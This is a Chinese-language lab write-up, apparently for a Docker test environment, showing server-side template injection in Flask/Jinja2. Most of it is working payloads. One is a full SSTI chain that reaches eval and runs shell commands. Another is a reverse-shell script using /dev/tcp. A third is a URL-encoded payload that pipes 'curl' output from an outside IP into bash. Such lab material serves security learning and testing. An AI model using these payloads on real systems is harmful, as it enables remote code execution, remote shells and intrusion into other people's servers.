# Flask（Jinja2） 服务端模板注入漏洞

## 测试

编译及运行测试环境：

```plain
docker compose build
docker compose up -d
```

访问http://your-ip/?name={{233*233}}，得到54289，说明SSTI漏洞存在。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874774127-ad386652-6fb5-4dc9-add7-c3d169161dd3.png)

获取eval函数并执行任意python代码的POC：

```plain
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

访问http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D，得到执行结果：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874774142-7018824a-bee0-49ef-9268-5fcf9c541536.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874774150-86ab66e8-9a23-48df-a446-bd3f7d72935d.png)

### 反弹shell

通过curl的方式反弹shell，bash.html文件内容：

```plain
/bin/bash -i >& /dev/tcp/your-ip/2333 0>&1
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874774154-5fdd975e-492f-4bff-b0a5-ca4b3e5fccaa.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874774133-10a069e0-51e2-4793-ba5a-83e4ee9f6e3b.png)

构造Payload：

```plain
http://flask-ip:8000/?name={% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("curl your-ip/bash.html | bash").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

URL编码后：

```plain
http://your-ip:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22curl%20101.42.237.61/bash.html%20|%20bash%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
```

浏览器访问，监听2333端口，成功接收反弹shell。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874774856-0390e43a-bbf7-43a1-9cfa-031fb5668c9a.png)

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780874775007-c249611e-dfbc-4535-8ba0-6bedc9fba279.png)